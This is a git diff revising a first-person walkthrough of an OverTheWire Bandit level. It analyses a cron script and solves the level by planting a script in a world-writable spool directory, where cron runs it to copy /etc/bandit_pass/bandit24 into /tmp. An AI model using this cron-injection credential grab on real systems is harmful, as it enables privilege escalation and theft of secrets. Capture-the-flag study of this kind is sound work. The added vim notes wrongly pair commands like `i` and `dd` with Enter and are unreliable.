@@ -8,7 +8,7 @@ A program is running automatically at regular intervals from cron, the time-base
 
 ## Initial Thoughts
 
-In this level, the challenge again hints that we should look in `/etc/cron.d/` to find the cron jobs being executed. Therefore, I will start by examining `/etc/cron.d/`.
+In this level, the challenge again hints that I should look in `/etc/cron.d/` to find the cron jobs being executed. Therefore, I will start by examining `/etc/cron.d/`.
 
 ---
 
@@ -47,7 +47,7 @@ Output:
 * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
 ```
 
-This file defines a system-wide cron job that executes `/usr/bin/cronjob_bandit24.sh` as `bandit24`. This cron job executes the script after reboot and every minute. The `&> /dev/null` redirects both `stdout` and `stderr` to `/dev/null`, meaning that the script's normal output and error messages are discarded.
+This file defines a system-wide cron job that executes `/usr/bin/cronjob_bandit24.sh` as `bandit24`. This cron job executes the script after the system reboot and every minute. The `&> /dev/null` redirects both `stdout` and `stderr` to `/dev/null`, meaning that the script's normal output and error messages are discarded.
 
 Therefore, I decided to examine the script directly.
 
@@ -94,17 +94,19 @@ myname=$(whoami)
 
 Since the cron job executes the script as `bandit24`, the value of `myname` is `bandit24`.
 
-Next, the script changes the working directory:
+Next, the script changes its working directory:
 
 ```bash
 cd /var/spool/"$myname"/foo || exit
 ```
 
-The script will be terminated if `cd` fails. Because the value of `myname` is `bandit24`, the working directory now is `/var/spool/bandit24/foo`.
+The script terminates if `cd` fails.
 
-Then, the script prints the purpose of the next loop statement, which is executing and deleting all scripts in `/var/spool/$myname/foo`.
+Because the value of `myname` is `bandit24`, the working directory becomes `/var/spool/bandit24/foo`.
 
-The loop statement iterates through all files and directories (hidden ones are included) in the working directory. The `if` statement sercurely checks to make sure that no `i` matches `.` or `..`.
+Then, the script prints a message before processing the files in that directory.
+
+The loop iterates through all entries in the working directory, including hidden entries:
 
 ```bash
 for i in * .*;
@@ -121,46 +123,117 @@ do
 done
 ```
 
-In short, with each `i`, the script:
+The condition:
 
-- inspects the owner of `i` using `stat --format "%U" "./$i"` and assigns the owner username to `owner`
-- uses `timeout -s 9 60 "./$i"` to execute `i` that is a regular file owned by `bandit23`
-- forcely and recursively removes `i`
+```bash
+[ "$i" != "." ] && [ "$i" != ".." ]
+```
 
-I realized that this script is executed with `bandit24`s' privilege and able to execute `bandit23`'s script located in `/var/spool/bandit24/foo`. Therefore, I though I can try to inject to `/var/spool/bandit24/foo` a script that secretly read `bandit24`'s password.
+ensures that `.` and `..` are not processed.
 
-To make sure this decision is possible, I checked the permission of `/var/spool/bandit24/foo`:
+For each entry `i`, the script:
+
+1. Inspects its owner using:
+
+```bash
+stat --format "%U" "./$i"
+```
+
+2. Stores the owner's username in the variable `owner`.
+
+3. Checks whether the entry:
+
+- is owned by `bandit23`
+- is a regular file
+
+```bash
+[ "${owner}" = "bandit23" ] && [ -f "$i" ]
+```
+
+4. If both conditions are true, executes the file with a maximum runtime of 60 seconds:
+
+```bash
+timeout -s 9 60 "./$i"
+```
+
+If the program is still running after 60 seconds, `timeout` sends signal `9` (`SIGKILL`).
+
+5. Removes the entry afterward:
+
+```bash
+rm -rf "./$i"
+```
+
+In short, the script executes regular files owned by `bandit23` and then removes the processed entries.
+
+I realized that this script runs with the privileges of `bandit24` and executes files owned by `bandit23` that are placed in `/var/spool/bandit24/foo`. Therefore, I though I could inject a script there that reads `bandit24`'s password and writes it to a location that I can access.
+
+To make sure this was possible, I checked the permission of `/var/spool/bandit24/foo`:
 
 ```bash
 stat /var/spool/bandit24/foo
 ```
 
-Its permission is `drwxrwx-wx`, which is a directory allowing others to create and execute scripts.
+Its permissions were `drwxrwx-wx`. This means that others have write and execute permissions, allowing them to create entries inside the directory and access known paths within it.
 
-### Step 4: Inject script to `/var/spool/bandit24/foo`
+### Step 4: Inject script in `/var/spool/bandit24/foo`
 
-I created a temporary directory `/tmp/Piggeright`. Remember to allow others can modify the directory because the script will run with privilege of `bandit24`.
+I created a temporary directory:
 
 ```bash
 mkdir /tmp/Piggeright
+```
+
+Because the injected script would run as `bandit24`, I needed to ensure that `bandit24` could create the output file inside this directory:
+
+```bash
 chmod 777 /tmp/Piggeright
 ```
 
-I decided to use this directory to store the stolen password.
+I then created a script named `inject.sh` using `vim`:
 
-Then I write the script:
+```bash
+vim /tmp/Piggeright/inject.sh
+```
+
+The script reads `bandit24`'s password and writes it to `password.txt`:
 
 ```bash
 #!/bin/bash
 cat "/etc/bandit_pass/bandit24" > "/tmp/Piggeright/password.txt"
 ```
 
+Next, I made the script executable:
 
+```bash
+chmod 777 /tmp/Piggeright/inject.sh
+```
 
-Then, I waited for 1 minute to let cron do its job. 
+> `777` is more permission than necessary, but it is fine for Bandit practice.
 
-# Remember to check preset perm when created of file and dir and how to check the setting rather than mannually trying
-# Vim in linux
+Then, I injected the script into `/var/spool/bandit24/foo`:
+
+```bash
+mv /tmp/Piggeright/inject.sh /var/spool/bandit24/foo
+```
+
+The cron job then processed the script. Since it was owned by `bandit23` and was a regular executable file, the cron script executed it as `bandit24`.
+
+The injected script therefore ran:
+
+```bash
+cat "/etc/bandit_pass/bandit24" > "/tmp/Piggeright/password.txt"
+```
+
+Because the script was running as `bandit24`, it had permission to read `/etc/bandit_pass/bandit24`.
+
+Finally, I read `password.txt`:
+
+```bash
+cat /tmp/Piggeright/password.txt
+```
+
+I then retrieved the password for the next level.
 
 ## Key Takeaways
 
@@ -284,6 +357,33 @@ timeout [options] [duration] [command/script]
 - `SIGINT` or `2` — simulates pressing `Ctrl`+`C` in the terminal
 - `SIGHUP` or `1` — simulates a lost terminal session or disconnected modem
 - `SIGKILL` or `9` — immediately terminates the process at the OS level
+
+### vim
+
+In Linux, `vim` (Vi Improved) is a powerful terminal-based text editor. You can use it to create and edit files directly in the command line.
+
+Syntax:
+
+```bash
+vim [file]
+```
+
+- If `[file]` exists → `vim` opens it.
+- If it doesn't exist → `vim` creates it.
+
+**Modes**
+
+1. Normal mode: When you open Vim, you start in Normal mode.
+  - `i` + `Enter` → enter Insert mode
+  - `dd` + `Enter` → delete a line
+  - `yy` + `Enter` → copy a line
+  - `:q` + `Enter` → quit
+  - `:w` + `Enter` → write (save)
+  - `:wq` + `Enter` → write and quit
+  - `:q!` + `Enter` → quit without writing
+
+2. Insert mode
+  - `Esc` → return to Normal mode
 
 ## References
 
